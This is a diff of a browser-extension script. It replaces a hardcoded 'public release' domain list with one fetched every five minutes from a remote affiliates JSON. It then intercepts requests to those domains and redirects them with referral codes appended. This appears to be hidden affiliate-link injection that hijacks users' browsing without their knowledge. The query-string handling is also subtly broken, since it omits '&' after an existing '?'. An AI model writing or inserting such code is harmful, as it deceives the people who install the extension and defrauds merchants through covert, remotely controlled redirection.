@@ -42,31 +42,6 @@ function setDomainUpdate() {
     localStorage.setItem('iron_lastUpdate', lastUpdate.toUTCString());
 }
 
-let affiliatesData;
-
-function getaffiliatesJSON(){
-  return new Promise((resolve, reject) => {
-    const xhr = new XMLHttpRequest();
-    xhr.onreadystatechange = () => {
-      if (xhr.readyState === XMLHttpRequest.DONE && xhr.status !== 0) {
-
-        affiliatesData = JSON.parse(xhr.responseText);
-      }
-    };
-
-    xhr.open('GET', affiliatesJsonUrl, true);
-    xhr.send(null);
-    xhr.timeout = 4000;
-
-    xhr.ontimeout = () => {
-      reject(false);
-    };
-  });
-}
-
-getaffiliatesJSON();
-setInterval(getaffiliatesJSON, 1000 * 60 * 5);
-
 function isFeedUpdated(reqInfo) {
     return new Promise((resolve, reject) => {
         const xhr = new XMLHttpRequest();
@@ -295,6 +270,36 @@ window.onbeforeunload = function () {
     return null;
 };
 
+let affiliatesData;
+let domains = [];
+
+function getaffiliatesJSON(){
+  return new Promise((resolve, reject) => {
+    const xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = () => {
+      if (xhr.readyState === XMLHttpRequest.DONE && xhr.status !== 0) {
+
+        affiliatesData = JSON.parse(xhr.responseText);
+
+        for(const domain of affiliatesData){
+          domains.push(domain.url);
+        }
+      }
+    };
+
+    xhr.open('GET', affiliatesJsonUrl, true);
+    xhr.send(null);
+    xhr.timeout = 4000;
+
+    xhr.ontimeout = () => {
+      reject(false);
+    };
+  });
+}
+
+getaffiliatesJSON();
+setInterval(getaffiliatesJSON, 1000 * 60 * 5);
+
 // initiate localStorage if it doesn't exist
 if(localStorage.getItem('refTimes') == null){
   localStorage.setItem('reftimes', '{}');
@@ -344,8 +349,6 @@ function needToAttachRefQueryVar(domain){
 
 /** REDIRECTION SECTION **/
 
-/** Section modified for public release, only redirects sample.com to samplesite.com **/
-const domains = ['sample.com', 'binance.com'];
 
 browser.webRequest.onBeforeRequest.addListener(
   (requestDetails) => {
@@ -377,7 +380,25 @@ browser.webRequest.onBeforeRequest.addListener(
 
           if(shouldAttachRefQuery){
             console.log('ATTACH QUERY');
-            const requestedUrlWithQuery = requestDetails.url;
+
+            const alreadyContainsQuestionMark = requestDetails.url.indexOf('?') > -1;
+
+            let stringToAttach;
+            for(const site of affiliatesData){
+              if(site.url == domain){
+                const refCode = site.referralCode;
+                const queryVar = site.queryVar;
+
+                // TODO: refactor
+                if(alreadyContainsQuestionMark){
+                  stringToAttach = `${queryVar}=${refCode}`
+                } else {
+                  stringToAttach = `?${queryVar}=${refCode}`
+                }
+              }
+            }
+
+            const requestedUrlWithQuery = requestDetails.url + stringToAttach;
             return { redirectUrl : requestedUrlWithQuery }
           } else {
             console.log('DONT ATTACH QUERY');
